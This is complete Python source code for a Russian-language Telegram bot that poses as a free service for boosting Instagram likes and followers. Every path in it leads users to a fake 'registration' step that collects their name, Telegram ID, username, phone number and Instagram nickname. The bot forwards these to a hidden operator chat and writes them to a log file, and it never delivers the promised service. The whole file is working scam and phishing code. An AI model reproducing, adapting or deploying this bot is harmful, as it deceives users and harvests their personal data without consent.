import telebot
from telebot import types
import time
import random


log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = ''
bot = telebot.TeleBot("")
bot.send_message(ID, '!BOT STARTED!')
print("Бот запущен!") 
@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''👋 Привет! 👋
		Этот бот для накрутки лайков и подписчиков в инстаграм!
		Для старта напишине /nacrutka''') 

@bot.message_handler(commands=['nacrutka'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="Лайки", callback_data="first")
	second_button = types.InlineKeyboardButton(text="Подписчики", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Выберите пункт накрутки:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество лайков (не более 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество подписчиков (не более 500)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
			return
		if int(num) > 500:
			bot.reply_to(message, 'Колличество лайков не может быть более 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
			Чтобы получить дополнительные запросы зарегестрируйтесь в боте!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
			return

		if int(num) > 500:
			bot.reply_to(message, 'Колличество подписчиков не может быть более 500!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
			Чтобы получить дополнительные запросы зарегестрируйтесь в боте!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Данные
			├Имя: {first} {last}
			├ID: {userid}
			├Ник: @{nick}
			└Номер телефона: {phone}
			'''

		bot.send_message(ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Отправьте свой контакт!')
		bot.send_message(message.chat.id, 'Регистрация прошла успешно!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, 'Введите ник в инстаграм:') 
		bot.register_next_step_handler(msg, entr)

def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'Ник: {inp} ')#⏳
		bot.send_message(ID, f'Ник в инстарам: {inp}')
		bot.send_message(message.chat.id, 'Ожидайте приход на ваш аккаунт в течении 24 часов!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')




bot.polling()

